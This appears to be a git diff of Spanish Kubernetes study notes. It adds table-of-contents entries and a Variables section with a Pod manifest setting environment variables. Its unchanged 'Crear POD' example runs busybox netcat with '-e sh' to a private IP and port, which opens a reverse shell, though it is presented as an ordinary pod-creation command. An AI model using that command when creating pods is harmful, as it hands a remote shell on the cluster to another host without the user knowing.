@@ -38,9 +38,11 @@
     - [maxUnavailable, maxSurge y minReadySeconds](#maxunavailable-maxsurge-y-minreadyseconds)
     - [Rollback](#Rollback)
 - [Variables, ConfigMaps y Secrets](#variables-configmaps-y-secrets)
-  
-### POD
+    - [Variables](#Variables)
+    -  [ConfigMaps](#ConfigMaps)
+    -  [Secrets](#Secrets)
 
+### POD
 ## Crear POD
 ```bash
 kubectl run <POD> --image=busybox -- /bin/sh -c "busybox nc 192.168.1.6 9001 -e sh"
@@ -675,4 +677,29 @@ spec:
 *Recreate* hace que Kubernetes elimine todos los pods actuales de un Deployment y los reemplace por los nuevos pods de una sola vez.
 
 ### Variables, ConfigMaps y Secrets
-d
+
+### Variables
+En el sistema operativo, se podrán imprimir (```env, echo $SO```).
+
+```yaml
+apiVersion: v1
+kind: Pod
+metadata:
+  name: apche2
+  labels:
+    so: Debian
+    account: pdn01
+    version: v1
+spec:
+  containers:
+    - name: httpd
+      image: httpd
+      env:  # Asegúrate de que 'env' esté dentro del contenedor
+        - name: SO
+          value: "Debian"
+        - name: DATABASE_URL
+          value: "mongodb://db:27017"
+```
+### ConfigMaps
+
+### Secrets
